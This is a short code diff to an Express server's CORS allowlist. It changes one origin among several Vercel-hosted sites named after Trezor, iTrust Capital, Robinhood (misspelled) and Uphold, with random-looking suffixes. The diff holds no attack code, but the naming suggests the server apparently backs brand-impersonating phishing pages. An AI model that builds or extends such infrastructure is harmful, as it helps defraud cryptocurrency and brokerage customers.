@@ -11,7 +11,7 @@ const PORT = process.env.PORT || 3000;
 // Middleware 
 app.use(cors({
     origin: ["http://localhost:3000",
-        "https://trezor-website-god-five-sigma-dfasf-324324-343244.vercel.app",
+        "https://trezor-website-rod-five-sigma-dfasf-324324-343244.vercel.app",
         "https://i-trust-capital-five-sigma-dfasf-324324-343244-pune.vercel.app",
         "https://robbinhood-i-capital-five-sigma-dfasf-324324-343244-pune.vercel.app",
         "https://uphold-eight-capital-five-sigma-dfasf-324324-343244-pune.vercel.app",
